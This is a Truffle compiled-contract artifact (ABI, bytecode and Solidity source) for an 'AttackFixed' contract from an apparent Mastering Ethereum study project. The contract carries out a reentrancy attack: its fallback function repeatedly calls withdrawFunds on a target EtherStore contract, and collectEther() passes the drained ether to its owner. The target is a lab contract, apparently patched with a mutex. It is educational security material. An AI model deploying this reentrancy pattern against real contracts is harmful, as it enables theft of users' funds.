{
  "contractName": "AttackFixed",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_untrustedEtherStoreAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "_sender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "LogFallbackCall",
      "type": "event"
    },
    {
      "stateMutability": "payable",
      "type": "fallback",
      "payable": true
    },
    {
      "inputs": [],
      "name": "untrustedEtherStore",
      "outputs": [
        {
          "internalType": "contract EtherStoreFixed",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [],
      "name": "attackUntrustedEtherStore",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "collectEther",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405230600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561005157600080fd5b5060405161065e38038061065e8339818101604052602081101561007457600080fd5b8101908080519060200190929190505050336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610548806101166000396000f3fe6080604052600436106100385760003560e01c806393b33d8b1461018b578063bb326312146101e2578063ff11e1db146101ec5761003f565b3661003f57005b7feeda8ea091404366d8f352cf63bd9e6eca7a4aec8475bb8915d44464b90a14cd3334604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019250505060405180910390a1670de0b6b3a7640000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631111561018957600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561017057600080fd5b505af1158015610184573d6000803e3d6000fd5b505050505b005b34801561019757600080fd5b506101a0610203565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101ea610229565b005b3480156101f857600080fd5b50610201610360565b005b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a764000034101561023e57600080fd5b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e2c41dbc670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102b057600080fd5b505af11580156102c4573d6000803e3d6000fd5b5050505050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561034657600080fd5b505af115801561035a573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610405576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602e8152602001806104e5602e913960400191505060405180910390fd5b60003373ffffffffffffffffffffffffffffffffffffffff164760405180600001905060006040518083038185875af1925050503d8060008114610465576040519150601f19603f3d011682016040523d82523d6000602084013e61046a565b606091505b50509050806104e1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260138152602001807f5472616e73616374696f6e206661696c65642e0000000000000000000000000081525060200191505060405180910390fd5b5056fe4f6e6c792074686520636f6e7472616374206f776e65722063616e2063616c6c20746869732066756e6374696f6ea264697066735822122082153297f41d2145ae08eec595a6e4d0c5f058e80807b8d29d3d6cd1cbb861d564736f6c634300060a0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport {EtherStoreFixed as UntrustedEtherStore} from \"./EtherStoreFixed.sol\";\nimport {Owned as TrustedOwned} from \"./Owned.sol\";\n\n/**\n * @title Mastering Ethereum Chapter 9, Attack contract.\n * @author Victor Navascues.\n * @notice Attempts to explout EtherStoreFixed contract.\n * @dev This contract has been modified regarding the original one, by adding\n * and access modified in the `collectEther()` function (inheriting `Owned`).\n * This contract differs from the book implementation in:\n *  - It implements the mutex logic follwing the Solidity official\n *  documentation example (via modifier, below):\n *    - https://solidity.readthedocs.io/en/v0.6.0/contracts.html?highlight=constructor#function-modifiers\n *\n *  - It implements some Consensys' best practices (link below):\n *    - https://consensys.github.io/smart-contract-best-practices/recommendations\n *\n *    - Contract layout (type declarations, state variables, events, and\n *    functions).\n *    - Mark untrusted contracts. NA.\n *    - Function arguments with leading underscore.\n *    - Log names starting with `Log`.\n *    - Don't use `transfer()` or `send()`.\n *    - Handle errors in external calls.\n *    - Use modifiers only for checks.\n *    - Improved `fallback()` (e.g. simple, log an event, and check data\n *    length). NA.\n *    - Use events to monitor contract activity.\n *    - Lock pragmas to specific compiler version. NA.\n *\n *  - Added the optional message in `require()`.\n */\ncontract AttackFixed is TrustedOwned {\n    UntrustedEtherStore public untrustedEtherStore;\n\n    event LogFallbackCall(address _sender, uint256 _value);\n\n    constructor(address _untrustedEtherStoreAddress) public {\n        untrustedEtherStore = UntrustedEtherStore(_untrustedEtherStoreAddress);\n    }\n\n    receive() external payable {}\n\n    function attackUntrustedEtherStore() external payable {\n        require(msg.value >= 1 ether);\n        untrustedEtherStore.depositFunds{value: 1 ether}();\n        untrustedEtherStore.withdrawFunds(1 ether);\n    }\n\n    function collectEther() public onlyOwner {\n        (bool success, ) = msg.sender.call{value: address(this).balance}(\"\");\n        require(success, \"Transaction failed.\");\n    }\n\n    fallback() external payable {\n        // Log `fallback()` calls for checking successful reentrancy attacks.\n        emit LogFallbackCall(msg.sender, msg.value);\n\n        if (address(untrustedEtherStore).balance > 1 ether) {\n            untrustedEtherStore.withdrawFunds(1 ether);\n        }\n    }\n}\n",
  "sourcePath": "/home/victor/Projects/ethereum/solidity_playground/mastering_ethereum/truffle/SCSecurity/contracts/reentrancy_attack/AttackFixed.sol",
  "compiler": {
    "name": "solc",
    "version": "0.6.10+commit.00c0fcaf.Emscripten.clang"
  },
  "schemaVersion": "3.2.0",
  "updatedAt": "2020-07-06T17:12:56.184Z",
  "networkType": "ethereum",
  "devdoc": {
    "author": "Victor Navascues.",
    "details": "This contract has been modified regarding the original one, by adding and access modified in the `collectEther()` function (inheriting `Owned`). This contract differs from the book implementation in:  - It implements the mutex logic follwing the Solidity official  documentation example (via modifier, below):    - https://solidity.readthedocs.io/en/v0.6.0/contracts.html?highlight=constructor#function-modifiers  - It implements some Consensys' best practices (link below):    - https://consensys.github.io/smart-contract-best-practices/recommendations    - Contract layout (type declarations, state variables, events, and    functions).    - Mark untrusted contracts. NA.    - Function arguments with leading underscore.    - Log names starting with `Log`.    - Don't use `transfer()` or `send()`.    - Handle errors in external calls.    - Use modifiers only for checks.    - Improved `fallback()` (e.g. simple, log an event, and check data    length). NA.    - Use events to monitor contract activity.    - Lock pragmas to specific compiler version. NA.  - Added the optional message in `require()`.",
    "methods": {},
    "title": "Mastering Ethereum Chapter 9, Attack contract."
  },
  "userdoc": {
    "methods": {},
    "notice": "Attempts to explout EtherStoreFixed contract."
  }
}